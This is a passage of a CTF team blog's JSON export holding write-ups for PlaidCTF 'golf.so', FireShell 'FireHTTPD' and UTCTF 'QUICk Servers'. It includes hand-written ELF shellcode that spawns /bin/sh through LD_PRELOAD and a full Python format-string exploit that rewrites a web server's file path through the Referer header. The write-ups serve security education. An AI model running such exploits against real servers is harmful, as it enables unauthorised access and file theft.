Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"Tcache","slug":"Pwn/x64/Glibc-Malloc/Tcache","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"},{"name":"tcache_dup","slug":"Pwn/x64/Glibc-Malloc/Tcache/tcache-dup","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/"},{"name":"tcache_poisoning","slug":"Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/"}],"tags":[{"name":"double_free","slug":"double-free","permalink":"https://teamrocketist.github.io/tags/double-free/"},{"name":"tcache_poisoning","slug":"tcache-poisoning","permalink":"https://teamrocketist.github.io/tags/tcache-poisoning/"},{"name":"heap","slug":"heap","permalink":"https://teamrocketist.github.io/tags/heap/"},{"name":"dicectf2021","slug":"dicectf2021","permalink":"https://teamrocketist.github.io/tags/dicectf2021/"}]},{"title":"[Misc] PCTF2020 - golf.so","slug":"Misc-PCTF2020-golf-so","date":"2020-04-20T12:04:00.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2020/04/20/Misc-PCTF2020-golf-so/","link":"","permalink":"https://teamrocketist.github.io/2020/04/20/Misc-PCTF2020-golf-so/","excerpt":"","text":"Golf.soSolves: 104 Points: 500 Description: Upload a 64-bit ELF shared object of size at most 1024 bytes. It should spawn a shell (execute execve(“/bin/sh”, [“/bin/sh”], …)) when used likeLD_PRELOAD= /bin/true golf.so.pwni.ng The objective of this challenge is to create an ELF shared library that when running like this: 1$ LD_PRELOAD=&lt;upload&gt; /bin/true It would spawn a shell, there is also a requirement the shared library must be less than 1024 bytes to pass the first level. The first thing I tried to do is to use the classic gcc. First I look up at the binary /bin/true with ghidra and It looks like /bin/true automaticly exists if the arguments are less than 2 so our option is to either overwrite the entry point or _libc_start_main. After searching online for the function signature of _libc_start_main I wrote this c file: 1234567891011int __libc_start_main( void *func_ptr, int argc, char* argv[], void (*init_func)(void), void (*fini_func)(void), void (*rtld_fini_func)(void), void *stack_end)&#123; char* args[] = &#123;\"/bin/sh\",0x0&#125;; execve(\"/bin/sh\", args, 0x0);&#125; Compiling it using gcc:1234$ gcc -shared lol.c -o lol.so$ LD_PRELOAD=./lol.so /bin/true$ iduid=0(root) gid=0(root) groups=0(root) We got a shell but unfortunately the file is too big: 12ls -ltah lol.so-rwxr-xr-x 1 root root 16K Apr 20 10:08 lol.so* 16k is a lot and we need to find a way to reduce its size… After some reading on the man page of gcc and some recomendations online I tried to use the following gcc options: norelro compile option. Stripping the binary. Activate no start files option for gcc. nodefault libraries. Turning on optimizations with -O3 This reduced the file size by a considerable amount: 123$ gcc -shared -nostartfiles -nodefaultlibs -shared -Wl,-z,norelro -s lol.c -O3$ ls -ltah a.out-rwxr-xr-x 1 root root 9.5K Apr 20 10:13 a.out And 9.5k was the max I could get by just using gcc, we need less than 1k. After this I found this post online about a creating tiny elf binaries by constructing the binary by hand using assembly. Perhaps the post is for elfs of the type ET_EXEC and we need ET_DYN also the did that for 32 bits we need 64. The possible file types of an ELF are: 12345ET_NONE An unknown type. (0x0)ET_REL A relocatable file. (0x1)ET_EXEC An executable file. (0x2)ET_DYN A shared object. (0x3)ET_CORE A core file. (0x4) We want ET_DYN a shared object, so after some smart searching on github for examples of shared objects in assembly I found this template, the string I used to find this was: 1db 0x7f, &quot;ELF&quot; ET_DYN We can straight up modify the _start label which is the entry point present in the dynamic section, to open a shell we need to execute the syscall execve we need to updated the registers RAX to 0x3b, RDI to a pointer to the string /bin/sh and RSI to a pointer to an array [“/bin/sh”,0x0]. My first shell code was: 123456789101112_start:mov rdi,0x68732f6e69622f ; /bin/sh to RDIpush rdi ; push /bin/sh to the stackpush rsp ; push current stack pointer to the stackpop rdi ; put the pointer of /bin/sh to RDIpush 59 ; push 0x3b to the stackpop rax ; get 0x3b from the stack to RAXpush 0 ; constructing the the finaly argument of the arraypush rdi ; push a pointer of /bin/sh to the stackmov rsi,rsp ; put a pointer to [&quot;/bin/sh&quot;,0x0] to RSIcdq ; Convert Doubleword to Quadword https://www.aldeid.com/wiki/X86-assembly/Instructions/cdqsyscall ; execve(&quot;/bin/sh&quot;,[&quot;/bin/sh&quot;,0x0],0x0) Putting this code in the template: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104; build with:; nasm elf_dll_x64_template.s -f bin -o template_x64_linux_dll.binBITS 64org 0ehdr: db 0x7f, &quot;ELF&quot;, 2, 1, 1, 0 ; e_ident db 0, 0, 0, 0, 0, 0, 0, 0 dw 3 ; e_type = ET_DYN dw 62 ; e_machine = EM_X86_64 dd 1 ; e_version = EV_CURRENT dq _start ; e_entry = _start dq phdr - $$ ; e_phoff dd shdr - $$ ; e_shoff dq 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 2 ; e_phnum dw shentsize ; e_shentsize dw 2 ; e_shnum dw 1 ; e_shstrndxehdrsize equ $ - ehdrphdr: dd 1 ; p_type = PT_LOAD dd 7 ; p_flags = rwx dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq 0xDEADBEEF ; p_filesz dq 0xDEADBEEF ; p_memsz dq 0x1000 ; p_alignphdrsize equ $ - phdr dd 2 ; p_type = PT_DYNAMIC dd 7 ; p_flags = rwx dq dynsection ; p_offset dq dynsection ; p_vaddr dq dynsection ; p_vaddr dq dynsz ; p_filesz dq dynsz ; p_memsz dq 0x1000 ; p_alignshdr: dd 1 ; sh_name dd 6 ; sh_type = SHT_DYNAMIC dq 0 ; sh_flags dq dynsection ; sh_addr dq dynsection ; sh_offset dq dynsz ; sh_size dd 0 ; sh_link dd 0 ; sh_info dq 8 ; sh_addralign dq 7 ; sh_entsizeshentsize equ $ - shdr dd 0 ; sh_name dd 3 ; sh_type = SHT_STRTAB dq 0 ; sh_flags dq strtab ; sh_addr dq strtab ; sh_offset dq strtabsz ; sh_size dd 0 ; sh_link dd 0 ; sh_info dq 0 ; sh_addralign dq 0 ; sh_entsizedynsection:; DT_INIT dq 0x0c dq _start; DT_STRTAB dq 0x05 dq strtab; DT_SYMTAB dq 0x06 dq strtab; DT_STRSZ dq 0x0a dq 0; DT_SYMENT dq 0x0b dq 0; DT_NULL dq 0x00 dq 0dynsz equ $ - dynsectionstrtab: db 0 db 0strtabsz equ $ - strtabglobal _start_start:;db 0xccmov rdi,0x68732f6e69622fpush rdipush rsppop rdipush 59pop raxpush 0push rdimov rsi,rspcdqsyscall Compiling it: 12345678$ nasm -f bin -o a.out full.asm$ ls -ltah a.out-rw-r--r-- 1 root root 427 Apr 20 11:28 a.out$ nasm -f bin -o a.out full.asm$ LD_PRELOAD=./a.out ./true$ iduid=0(root) gid=0(root) groups=0(root)$ exit So with this we got a shared file with 427 bytes! more than half of the asked 1024 bytes, so lets upload in the site: 1You made it to level 1: considerable! You have 127 bytes left to be thoughtful. This effort is worthy of 0/2 flags. So this effort as expected is not enough for a flag, we need to save at least more 127 bytes for the first flag. What I did next was to remove unnecessary sections from the elf something that would not broke the binary.The first thing I did was to remove the Section header (shdr). Its not really required, so the changes done to full.asm were: e_shoff in the elf header(ehdr) to point to the program header (phdr) e_shentsize in the elf header(ehdr) value to zero e_shnum in the elf header(ehdr) value to zero (the number of section headers set to zero because we completly removed this section) The full script to cuted.asm: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182; build with:; nasm elf_dll_x64_template.s -f bin -o template_x64_linux_dll.binBITS 64org 0ehdr: db 0x7f, &quot;ELF&quot;, 2, 1, 1, 0 ; e_ident db 0, 0, 0, 0, 0, 0, 0, 0 dw 3 ; e_type = ET_DYN dw 62 ; e_machine = EM_X86_64 dd 1 ; e_version = EV_CURRENT dq _start ; e_entry = _start dq phdr - $$ ; e_phoff dd phdr - $$ ; e_shoff (chaged to phdr instead of shdr) dq 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 2 ; e_phnum dw 0 ; e_shentsize (changed to 0) dw 0 ; e_shnum (changed to 0) dw 1 ; e_shstrndxehdrsize equ $ - ehdrphdr: dd 1 ; p_type = PT_LOAD dd 7 ; p_flags = rwx dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq 0xDEADBEEF ; p_filesz dq 0xDEADBEEF ; p_memsz dq 0x1000 ; p_alignphdrsize equ $ - phdr dd 2 ; p_type = PT_DYNAMIC dd 7 ; p_flags = rwx dq dynsection ; p_offset dq dynsection ; p_vaddr dq dynsection ; p_vaddr dq dynsz ; p_filesz dq dynsz ; p_memsz dq 0x1000 ; p_align; shdr header removed heredynsection:; DT_INIT dq 0x0c dq _start; DT_STRTAB dq 0x05 dq strtab; DT_SYMTAB dq 0x06 dq strtab; DT_STRSZ dq 0x0a dq 0; DT_SYMENT dq 0x0b dq 0; DT_NULL dq 0x00 dq 0dynsz equ $ - dynsectionstrtab: db 0 db 0strtabsz equ $ - strtabglobal _start_start:;db 0xccmov rdi,0x68732f6e69622fpush rdipush rsppop rdipush 59pop raxpush 0push rdimov rsi,rspcdqsyscall This was enough to get us the first flag:1234You made it to level 2: thoughtful! You have 75 bytes left to be hand-crafted. This effort is worthy of 1/2 flags. PCTF&#123;th0ugh_wE_have_cl1mBed_far_we_MusT_St1ll_c0ntinue_oNward&#125; A lot of improvements can be done after this for example we have a lot of unnecessary entries in the dynamic section like DT_NULL, DT_SYMENT and DT_STRSZ. We can remove that a save a lot of bytes: 12345678910111213141516171819202122232425262728293031...truncated...dynsection:; DT_INIT dq 0x0c dq _start; DT_STRTAB dq 0x05 dq strtab; DT_SYMTAB dq 0x06 dq strtabdynsz equ $ - dynsectionstrtab: db 0 db 0strtabsz equ $ - strtabglobal _start_start:;db 0xccmov rdi,0x68732f6e69622fpush rdipush rsppop rdipush 59pop raxpush 0push rdimov rsi,rspcdqsyscall 123$ nasm -f bin -o a.out cuted.asm$ ls -ltah a.out-rw-r--r-- 1 evilgod evilgod 251 Apr 20 11:58 a.out We reduced to 251 bytes, still far from obtaining the necessary 194 for the 2nd flag. More improvements can be done for example we can cut the last 3 fields of the elf header, which are related to the the section header that we previously removed (e_shentsize, e_shnum and e_shstrndx). With that we saved up 6 bytes, another way to save even more bytes is to cut the last fields of the PT_DYNAMIC entry from the program header(phdr) fortunelly this won’t break the lib, in the end this entry will overlap with the dynamic section which is perfectly fine. So the next fields to remove are p_vaddr,p_filesz,p_memsz,p_align. The assembly file looks like this right now: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465; build with:; nasm elf_dll_x64_template.s -f bin -o template_x64_linux_dll.binBITS 64org 0ehdr: db 0x7f, &quot;ELF&quot;, 2, 1, 1, 0 ; e_ident db 0, 0, 0, 0, 0, 0, 0, 0 dw 3 ; e_type = ET_DYN dw 62 ; e_machine = EM_X86_64 dd 1 ; e_version = EV_CURRENT dq _start ; e_entry = _start dq phdr - $$ ; e_phoff dd phdr - $$ ; e_shoff (chaged to phdr instead of shdr) dq 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 2 ; e_phnumehdrsize equ $ - ehdrphdr: dd 1 ; p_type = PT_LOAD dd 7 ; p_flags = rwx dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq 0xDEADBEEF ; p_filesz dq 0xDEADBEEF ; p_memsz dq 0x1000 ; p_alignphdrsize equ $ - phdr dd 2 ; p_type = PT_DYNAMIC dd 7 ; p_flags = rwx dq dynsection ; p_offset dq dynsection ; p_vaddrdynsection:; DT_INIT dq 0x0c dq _start; DT_STRTAB dq 0x05 dq strtab; DT_SYMTAB dq 0x06 dq strtabdynsz equ $ - dynsectionstrtab: db 0 db 0strtabsz equ $ - strtabglobal _start_start:;db 0xccmov rdi,0x68732f6e69622fpush rdipush rsppop rdipush 59pop raxpush 0push rdimov rsi,rspcdqsyscall Compiling it we can see we got this into to a file of size 213 bytes:123$ nasm -f bin -o a.out cuted.asm$ ls -ltah a.out-rw-r--r-- 1 root root 213 Apr 20 12:13 a.out Still not enough for the final flag, we still need to save 19 bytes, so the next step for me is to optimize the shell code at start, we have some fields we can controll without breaking the binary so the next step for me was to include the /bin/sh string in this kind of fields so we don’t require to put it in the stack and manipulate those pointers. This can save use some bytes. I saved the /bin/sh string in the p_filesz field of the PT_LOAD entry in the program header.One thing that helped me a lot while debugging a shell was to put a int 3 instruction before my shell code, this will stop gdb and act like a breakpoint(SIG TRAP) since I wasn’t able to stop at the entry point this helped me a lot on debugging: 12345678910111213_start:db 0xcc ; SIGTRAP (int 3 instruction)mov rdi,0x68732f6e69622fpush rdipush rsppop rdipush 59pop raxpush 0push rdimov rsi,rspcdqsyscall Now going into modifying the p_filesz entry to /bin/sh string: 1234567891011...phdr: dd 1 ; p_type = PT_LOAD dd 7 ; p_flags = rwx dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq 0x68732f6e69622f ; p_filesz (now has /bin/sh here) dq 0xDEADBEEF ; p_memsz dq 0x1000 ; p_align... Also need to get the offset to this entry, like libc this is also a shared library and a space will be assigned for this lib to be located. Luckily a pointer is saved in the RAX register in the begining when the entry code is executed. We can calculated the offset from there by using gdb: 12pwndbg&gt; set environment LD_PRELOAD ./a.outpwndbg&gt; r The address present in rax:So we can verify where the /bin/sh is located by doing: 12pwndbg&gt; x/s $rax-0x620x7fff194f205a: \"/bin/sh\" After this we can use the lea assembly instruction to get the adress of binsh and save a lot of bytes: 123456789_start:lea rdi,[rax-0x62]push 59pop raxpush 0push rdimov rsi,rspcdqsyscall Lets check how much is left: 123$ nasm -f bin -o a.out cuted.asm$ ls -ltah a.out-rw-r--r-- 1 root root 204 Apr 20 12:46 a.out Also we don’t a space reserving for strtab so we can make it point to _start instead of creating a label with two dbs. Updating the script from: 12345678910111213141516dynsection:; DT_INIT dq 0x0c dq _start; DT_STRTAB dq 0x05 dq strtab; DT_SYMTAB dq 0x06 dq strtabdynsz equ $ - dynsectionstrtab: db 0 db 0strtabsz equ $ - strtab To: 1234567891011dynsection:; DT_INIT dq 0x0c dq _start; DT_STRTAB dq 0x05 dq _start; DT_SYMTAB dq 0x06 dq _startdynsz equ $ - dynsection Two bytes are now saved: 123$ nasm -f bin -o a.out cuted.asm$ ls -ltah a.out-rw-r--r-- 1 root root 202 Apr 20 12:49 a.out We now need one final tweak for our script to be able to get the final flag… What I did in the end was to overlap the dynamic section into the PT_DYNAMIC entry, we can control the p_offset field without breaking the elf so we can use it as an index of the dynsection and make a fake DT_STRTAB entry, so the dynamic section will be overlapped saving us something like 0x10 bytes (the old entry DT_STRTAB is removed so we can save 0x10 bytes). Due to this action we also need to update the offset in the _start(updated to 0x50).My final payload was:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849BITS 64org 0ehdr: db 0x7f, &quot;ELF&quot;, 2, 1, 1, 0 ; e_ident db 0, 0, 0, 0, 0, 0, 0, 0 dw 3 ; e_type = ET_DYN dw 62 ; e_machine = EM_X86_64 dd 1 ; e_version = EV_CURRENT dq _start ; e_entry = _start dq phdr - $$ ; e_phoff dd phdr - $$ ; e_shoff (chaged to phdr instead of shdr) dq 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 2 ; e_phnumehdrsize equ $ - ehdrphdr: dd 1 ; p_type = PT_LOAD dd 7 ; p_flags = rwx dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq 0x68732f6e69622f ; p_filesz dq 0xDEADBEEF ; p_memsz dq 0x1000 ; p_alignphdrsize equ $ - phdr dd 2 ; p_type = PT_DYNAMIC dd 7 ; p_flags = rwxdynsection:; DT_STRTAB dq 0x5 ; p_offset (OVERLAPPED) dq dynsection ; p_vaddr; DT_INIT dq 0x0c dq _start; DT_SYMTAB dq 0x06 dq _startglobal _start_start:lea rdi,[rax-0x50]push 59pop raxpush 0push rdimov rsi,rsp;cdq ; this may be needed locally but in the website accepts anyway without this (1 byte save)syscall We get a file of 185 bytes :) more than enough to get the final flag123$ nasm -f bin -o a.out cuted.asm$ ls -ltah a.out-rw-r--r-- 1 root root 185 Apr 20 12:57 a.out The flag was: 123You made it to level 5: record-breaking! You have 9 bytes left to be astounding.This effort is worthy of 2/2 flags. PCTF&#123;th0ugh_wE_have_cl1mBed_far_we_MusT_St1ll_c0ntinue_oNward&#125; PCTF&#123;t0_get_a_t1ny_elf_we_5tick_1ts_hand5_in_its_ears_rtmlpntyea&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"assembly","slug":"assembly","permalink":"https://teamrocketist.github.io/tags/assembly/"},{"name":"elf","slug":"elf","permalink":"https://teamrocketist.github.io/tags/elf/"},{"name":"pctf2020","slug":"pctf2020","permalink":"https://teamrocketist.github.io/tags/pctf2020/"},{"name":"nasm","slug":"nasm","permalink":"https://teamrocketist.github.io/tags/nasm/"},{"name":"preload","slug":"preload","permalink":"https://teamrocketist.github.io/tags/preload/"}]},{"title":"[Pwn] FireShell CTF 2020 - FireHTTPD","slug":"Pwn-FireShell-CTF-2020-FireHTTPD","date":"2020-03-23T00:45:41.000Z","updated":"2022-08-23T01:20:11.161Z","comments":true,"path":"2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/","link":"","permalink":"https://teamrocketist.github.io/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/","excerpt":"","text":"FireHTTPD Solves: 23 Points: 492 Description:UPDATE: Server is running in /home/ctf/firehttpd Flag is on /home/ctf/flag http://142.93.113.55:31084/ firehttpda6e05cc456b289505a6c5e36f0c04ed5 libc.so.62fb0d6800d4d79ffdc7a388d7fe6aea0 Author: Alisson Bezerra HTTP ServerFirst of all thanks to Alisson for creating a challenge that is close to a real app, something that is close to reality as we say in Portugal a challenge with “head, torso and limbs”. Back to the challenge firehttpd is a http server, after looking at the code in the function serve_file we can find a format string vulnerability in sprintf: 12345678910111213141516171819202122 unsigned __int64 __fastcall serve_file(unsigned int a1, const char *a2) &#123; ... v5 = strstr(a2, \"..\"); while ( v3 &gt; 0 &amp;&amp; strcmp(\"\\n\", &amp;s1) ) &#123; v3 = get_line(a1, &amp;s1, 1024LL); if ( !strncmp(&amp;s1, \"Referer: \", 9uLL) ) sprintf(&amp;s, &amp;s1); // format string vulnerability &#125; if ( access(a2, 0) == -1 || v5 ) &#123; not_found(a1); &#125; else &#123; headers(a1, a2, &amp;s); stream = fopen(a2, \"r\"); cat(a1, stream); fclose(stream); &#125; ...&#125; Also there is a .. filter to prevent file transversal, strstr will return a pointer if finds a “..” in the string and if that happens we will fall in to the not_found thus not reading the flag file. SolutionThe easiest solution was to actually use format string to clear a5 variable with this you could file transversal by bypassing the filter. But during the ctf I didn’t pay much attention to the “..” filter and only focused on the string containing the file path which made the challenge a bit harder, because we kind of need to clear the path present there and also write 4 characters(“flag”) to open the file. I will explain my solution, the first thing is to leak a stack address because we want to modify the value of a local variable and as we know local variables are stored in the stack, we can try to find a pointer to the path in the stack by using the telescope command of pwndbg: First we set a breakpoint:123456pwndbg&gt; b mainpwndbg&gt; rpwndbg&gt; pieCalculated VA from /ctf/pwn/firehttpd/firehttpd = 0x555555554000pwndbg&gt; b *0x555555554000+0x2011pwndbg&gt; c The moment that it hit the breakpoint:Then we can use telescope command to check the values in the stack:As you can see above the pointer to the file path is at the 5th position so lets leak it with format string: 12345678910111213def formats(s): while True: try: return requests.get(url,headers=&#123; 'Content-Type': 'text/html', 'Server': 'FireHTTPD/0.0.1', 'Referer':s&#125;) except requests.exceptions.ConnectionError: print('error') passr=formats('%5$lx')FILENAME = int(r.headers['Referer'],16) Now we need to write into that address, since the server is always running and doesn’t restart we can split the exploit in different request. We need to write 4 bytes and clear the previous path, we can use %ln to clear the path with nulls, the l length modifier means long which goes up to 8 bytes which is what we really want to clear the entire path. Next I tried to use two %hn like we usually do in printf challenges but for some reason I was getting some memory errors, maybe because the number of the printed characters required was too high. If you want to know more about length modifiers you can read the man page of printf:1$ man printf\\(3\\) Two %hn didn’t work so to write four characters we need to do four %hhn each one will write the maximum of a char 1 byte: 123456789101112payload = '%19$ln'payload += '%&#123;&#125;x%19$hhn'.format(0x66-9) # f 0x66payload += '%&#123;&#125;x%20$hhn'.format(0x106) # l 0x6cpayload += '%&#123;&#125;x%21$hhn'.format(0x94+0x61) # a 0x61payload += '%&#123;&#125;x%22$hhn'.format(1+0x5) # g 0x67payload = payload.encode() # python3 shenaniganspayload += b'_'* (56-len(payload)-1)payload += p64(FILENAME)payload += p64(FILENAME+1)payload += p64(FILENAME+2)payload += p64(FILENAME+3)r=formats(payload) # r.text bugs out and doesn't print the body Yes the offsets above are a mess but hey it works! (those could be calculated via debugging and do the writes one by one), also since I was using python requests to communicate with the http server for some reason the flag didn’t come out in the body (r.text). We could solve this problem by just communicate with the server directly via tcp and construct manually the HTTP payload, another idea would be to capture the traffic using wireshark or you could do it like I did by doing an extra request to print the value where it was saved in the stack by using %s luckily the string was still saved in the stack in the next request. 12345KK = FILENAME-0xf30payload = b'__%13$s' # Getting the flag in the next requestpayload += p64(KK)r=formats(payload)print(r.headers) The full exploit:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *import requests#host, port = \"127.0.0.1\", \"1337\"filename = \"./firehttpd\"elf = ELF(filename)context.arch = 'amd64'def tohex(val, nbits): return (val + (1 &lt;&lt; nbits)) % (1 &lt;&lt; nbits)if not args.REMOTE: url = 'http://127.0.0.1:1337/index.html' libc = elf.libcelse: url = 'http://142.93.113.55:31084/' libc = ELF('./libc.so.6')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)context.terminal = ['tmux', 'new-window'] # remove this if you don't use tmuxdef formats(s): while True: try: return requests.get(url,headers=&#123; 'Content-Type': 'text/html', 'Server': 'FireHTTPD/0.0.1', 'Referer':s&#125;) except requests.exceptions.ConnectionError: print('error') passr=formats('%5$lx')FILENAME = int(r.headers['Referer'],16)FLAG = 0x67616c66payload = '%19$ln'payload += '%&#123;&#125;x%19$hhn'.format(0x66-9) # f 0x66payload += '%&#123;&#125;x%20$hhn'.format(0x106) # l 0x6cpayload += '%&#123;&#125;x%21$hhn'.format(0x94+0x61) # a 0x61payload += '%&#123;&#125;x%22$hhn'.format(1+0x5) # g 0x67payload = payload.encode() # python3 shenaniganspayload += b'_'* (56-len(payload)-1)payload += p64(FILENAME)payload += p64(FILENAME+1)payload += p64(FILENAME+2)payload += p64(FILENAME+3)r=formats(payload) # r.text bugs out and doesn't print the bodyKK = FILENAME-0xf30payload = b'__%13$s' # Getting the flag in the next requestpayload += p64(KK)r=formats(payload)print(r.headers) Running it: 1234567891011121314$ python3 firehttpd.py REMOTE[*] '/ctf/work/pwn/firehttpd/firehttpd' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/ctf/work/pwn/firehttpd/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled&#123;'Referer': '__F#&#123;0h_th0s3_f0rm4t_str1ngs&#125;', 'Content-Type': 'text/html', 'Server': 'FireHTTPD/0.0.1'&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Format String","slug":"Pwn/x64/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"}],"tags":[{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"fireshell2020","slug":"fireshell2020","permalink":"https://teamrocketist.github.io/tags/fireshell2020/"}]},{"title":"[Network] UTCTF 2020 - QUICk Servers","slug":"Network-UTCTF-2020-QUICk-Servers","date":"2020-03-11T11:43:02.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2020/03/11/Network-UTCTF-2020-QUICk-Servers/","link":"","permalink":"https://teamrocketist.github.io/2020/03/11/Network-UTCTF-2020-QUICk-Servers/","excerpt":"","text":"QUICk Servers Solves: 17 Points: 1988 Description:I have a pretty cool server, but it’s for QUICk people only. Nobody else is allowed. Pro Tip: Set your ALPN to “quic-echo-example” because I forgot to remove it. 54.152.23.18:1337 Author: masond ChallengeI didn’t solve the challenge during the ctf mainly because my lack of experience with golang and also my ability to identify the issues was affected by the lack of sleeping. Anyway this was a cool challenge made me learn about the QUIC protocol and some new things about the go language. The title of the challenge gives us the hint that this may be a server running on the QUIC protocol also in the description we were given the ip and port to the server. Initially I tried to use a python library for quick but I failed horribly when connecting to the server, by searching the the hint of setting the APLN to “quic-echo-example” on github I ended up searching some examples on how to connect to a QUIC server using a library named quick-go . So what exactly is QUIC? Quic is a network-protocol designed by Jim Roskind at Google, it was mainly created to improve the performance of connection-oriented web applications using the UDP protocol instead of TCP. Finding an exampleBy searching by “quic-echo-example” on github I found an example. After this I adapted the source code to connect to the challenge server but I ended up finding a lot of difficulties during of the installation of quick-go lib, every time I tried to install it with go get . command I was receiving an odd error about a “Duplicate stream ID”. Spent a lot of time searching on the web for this and found nothing. In the end, I ended finding out why I was having problems, I was trying to install the master branch of github and it required 1.14 version of golang… In my host machine I only had the 1.13 installed. To solve this problem I decided to use Docker. By specifying the right version as the tag I could use the right version of golang: 123$ ls main.go$ sudo docker run --rm -v $(pwd):/go/src/myapp -w /go/src/myapp -it golang:1.14 /bin/bash After this I run into another problem I installed the master branch release which is unstable as fuck and also incompatible with the one running on the server. This is was when I learned about go modules, we can specify the right version with it so I searched in the github releases and the last stable release is v0.14.0: 1234567891011$ go mod init .$ go mod edit -require github.com/lucas-clemente/quic-go@v0.14.0$ go get -v -t .$ go build$ go install$ cat go.mod module myappgo 1.14require github.com/lucas-clemente/quic-go v0.14.0 And finally I was able to connect to the server: 123$ go run main.goClient: Sending &apos;feqfq&apos;Maybe you should start with Hello... So the server replies that we should start with Hello, first we do the TLS configuration and specify the nextProtos as “quic-echo-example” as specified in the challenge description: 1234tlsConf := &amp;tls.Config&#123; InsecureSkipVerify: true, NextProtos: []string&#123;\"quic-echo-example\"&#125;,&#125; Then we create the connection and the stream: 123456789session, err := quic.DialAddr(addr, tlsConf, nil)if err != nil &#123; return err&#125;stream, err := session.OpenStreamSync(context.Background())if err != nil &#123; return err&#125; Sending the hello message and receiving the response: 1234567891011121314151617181920212223func readBytes(stream io.Reader, n int) error &#123; for i:=0; i&lt; n; i++ &#123; buf := make([]byte, 1) _, err := io.ReadFull(stream, buf); if err != nil &#123; return err &#125; fmt.Printf(\"%s\", buf); &#125; return nil&#125;fmt.Printf(\"Client: Sending '%s'\\n\", message)_, err = io.WriteString(stream,message)if err != nil &#123; return err&#125;err = readBytes(stream, 248)if err != nil &#123; return err&#125; 1234567$ go run main.goClient: Sending 'Hello'Welcome to the super QUICk Server!You might've thought getting the flag would be easy, but it's gonna take a bit more. :DI need some help with my Computer Architecture class, could you give me these numbers back in hex?123454 This is the first hand of questions and is about converting decimal integers to hexa, this is where I got stuck mainly because I didn’t understand really well how golang read stream functions worked. The problem was on the number extraction, I was reading the last line with the number, but some times the number to be converted had less than 6 numbers and this is where I failed to understand the problem, when less than 6 the last line would be presented as “1234 \\n” with spaces between the numbers and the new line, I was only striping the new line, because of this when sending the answer to the server everything started to hang up. After the CTF and a day of rest I found out about the spaces and took another approach, something that I should have used since the beginning, which is using regex to extract those numbers instead of parsing them by “hand”. 1234567891011121314151617181920212223242526func toHex(x []byte, n int) string &#123; re := regexp.MustCompile(\"[0-9]+\") h,err := strconv.Atoi(re.FindString(string(x))) if err != nil &#123; panic(err) &#125; return fmt.Sprintf(\"%x\", h)&#125;for i:=0; i&lt; 1000; i++ &#123; num := make([]byte, 7) n, err := stream.Read(num); if err != nil &#123; return err &#125; s := \"0x\"+toHex(num,n) //fmt.Printf(\"%d\\n\", i) //fmt.Printf(\"Received %s\", num); //fmt.Printf(\"Sending %s\\n\",s) //_,err = io.WriteString(stream,s) _, err = stream.Write([]byte(s)) if err != nil &#123; return err &#125;&#125;b, err := ioutil.ReadAll(stream)fmt.Printf(\"%s\\n\", b) After converting 1000 decimal numbers we get the respective answer: 123456789$ go run main.goClient: Sending 'Hello'Welcome to the super QUICk Server!You might've thought getting the flag would be easy, but it's gonna take a bit more. :DI need some help with my Computer Architecture class, could you give me these numbers back in hex?Quickly, of course... :)Nice job, let's keep going...Can I dial you later? I'll try 6969 ;) This time the server is trying to connect to us, so we need to turn us into a “server” and listen at the port 6969, for this we need to open a port in the router and rerun the docker container with the -p parameter to link the UDP port with the host: 123456$ sudo docker run --rm -p 6969:6969/udp -v (pwd):/go/src/myapp -w /go/src/myapp -it golang:1.14 /bin/bash$ go mod init .$ go mod edit -require github.com/lucas-clemente/quic-go@v0.14.0$ go get -v -t .$ go build$ go install Also if you have a local firewall like I have in my computer you need to open that door too, in my case I use UFW firewall: 1234$ sudo ufw allow 6969/udp$ sudo ufw status6969/udp ALLOW Anywhere 6969/udp (v6) ALLOW Anywhere (v6) To run the server we need to put it in another thread, we can use go-coroutines but we also have to add a code that waits for the server thread to end before quitting the main program, this can be pretty easily done with go by using sync.WaitGroup: 12345678910func main() &#123; var wg sync.WaitGroup wg.Add(1) go func() &#123; log.Fatal(echoServer()) &#125;() err := clientMain() if err != nil &#123; panic(err) &#125; wg.Wait()&#125; In the code above go func() initiates the server coroutine and increases the WaitGroup counter, we put a Wait() in the end of the main function so it 